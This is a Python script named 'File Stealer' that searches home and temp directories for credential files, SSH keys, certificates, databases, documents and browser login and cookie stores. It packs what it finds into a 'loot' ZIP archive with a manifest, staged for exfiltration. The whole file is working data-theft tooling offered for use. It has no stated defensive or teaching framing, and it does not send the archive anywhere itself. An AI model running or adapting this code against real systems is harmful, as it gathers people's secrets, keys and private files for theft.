#!/usr/bin/env python3
"""File Stealer — Targeted file discovery, collection, and staging for exfiltration"""
import os, sys, time, hashlib, json as _json, struct, shutil, zipfile, tempfile

class FileStealer:
    INTERESTING_PATTERNS = {
        "credentials": [".env", "credentials", "password", "secret", "token", "api_key",
                        ".netrc", ".pgpass", ".my.cnf", "wp-config.php", "config.ini"],
        "ssh_keys": ["id_rsa", "id_ed25519", "id_ecdsa", "authorized_keys", "known_hosts"],
        "certificates": [".pem", ".key", ".crt", ".p12", ".pfx", ".jks"],
        "databases": [".sqlite", ".db", ".sql", ".dump", ".bak"],
        "documents": [".doc", ".docx", ".pdf", ".xlsx", ".pptx", ".odt"],
        "source_code": [".py", ".js", ".php", ".rb", ".go", ".java", ".cs"],
        "config_files": [".conf", ".cfg", ".yaml", ".yml", ".toml", ".json", ".xml", ".properties"],
        "browser_data": ["Login Data", "Cookies", "History", "Web Data", "places.sqlite", "logins.json"],
    }
    MAX_FILE_SIZE = 50 * 1024 * 1024

    def __init__(self, search_paths=None, categories=None, max_depth=5):
        self.search_paths = search_paths or [os.path.expanduser("~"), "/tmp"]
        self.categories = categories or list(self.INTERESTING_PATTERNS.keys())
        self.max_depth = max_depth
        self.collected = []
        self.total_size = 0

    def _matches_pattern(self, filepath):
        name = os.path.basename(filepath).lower()
        for category in self.categories:
            patterns = self.INTERESTING_PATTERNS.get(category, [])
            for pattern in patterns:
                if pattern.startswith("."):
                    if name.endswith(pattern): return category
                else:
                    if pattern.lower() in name: return category
        return None

    def scan(self):
        print("[*] Scanning for interesting files...")
        for base_path in self.search_paths:
            if not os.path.isdir(base_path): continue
            for root, dirs, files in os.walk(base_path):
                depth = root.replace(base_path, "").count(os.sep)
                if depth >= self.max_depth:
                    dirs.clear()
                    continue
                skip = [".git", "__pycache__", "node_modules", ".cache", ".local/share/Trash"]
                dirs[:] = [d for d in dirs if d not in skip and not d.startswith(".")]
                for fname in files:
                    filepath = os.path.join(root, fname)
                    category = self._matches_pattern(filepath)
                    if category:
                        try:
                            size = os.path.getsize(filepath)
                            if size > self.MAX_FILE_SIZE or size == 0: continue
                            self.collected.append({"path": filepath, "category": category,
                                "size": size, "hash": self._file_hash(filepath)})
                            self.total_size += size
                        except (PermissionError, OSError): continue
        print("[*] Found " + str(len(self.collected)) + " files (" + self._fmt_size(self.total_size) + ")")
        by_cat = {}
        for f in self.collected:
            by_cat.setdefault(f["category"], []).append(f)
        for cat, files in sorted(by_cat.items()):
            print("  " + cat + ": " + str(len(files)) + " files")
            for f in files[:3]:
                print("    " + f["path"] + " (" + self._fmt_size(f["size"]) + ")")
            if len(files) > 3:
                print("    ... and " + str(len(files) - 3) + " more")
        return self.collected

    def _file_hash(self, filepath):
        h = hashlib.sha256()
        try:
            with open(filepath, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    h.update(chunk)
            return h.hexdigest()[:16]
        except: return "error"

    def _fmt_size(self, size):
        for unit in ["B", "KB", "MB", "GB"]:
            if size < 1024: return "{:.1f}{}".format(size, unit)
            size /= 1024
        return "{:.1f}TB".format(size)

    def stage(self, output_dir=None):
        output_dir = output_dir or tempfile.mkdtemp(prefix="exfil_")
        archive_path = os.path.join(output_dir, "loot_" + time.strftime("%Y%m%d_%H%M%S") + ".zip")
        print("[*] Staging " + str(len(self.collected)) + " files to " + archive_path)
        with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
            manifest = []
            for f in self.collected:
                try:
                    arc_name = f["category"] + "/" + os.path.basename(f["path"])
                    zf.write(f["path"], arc_name)
                    manifest.append({"path": f["path"], "archive": arc_name,
                        "size": f["size"], "hash": f["hash"], "category": f["category"]})
                except: continue
            zf.writestr("manifest.json", _json.dumps(manifest, indent=2))
        archive_size = os.path.getsize(archive_path)
        ratio = archive_size / max(self.total_size, 1) * 100
        print("[*] Archive: " + self._fmt_size(archive_size) + " ({:.0f}% compression)".format(ratio))
        return archive_path

def demo():
    print("[*] File Stealer Demo")
    stealer = FileStealer(search_paths=["/tmp"], max_depth=2)
    print("  Categories: " + str(list(stealer.INTERESTING_PATTERNS.keys())))
    print("  Pattern count: " + str(sum(len(v) for v in stealer.INTERESTING_PATTERNS.values())))
    stealer.scan()
    print("  Demo complete")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        stealer = FileStealer(search_paths=sys.argv[1:])
        stealer.scan()
        stealer.stage()
    else:
        demo()

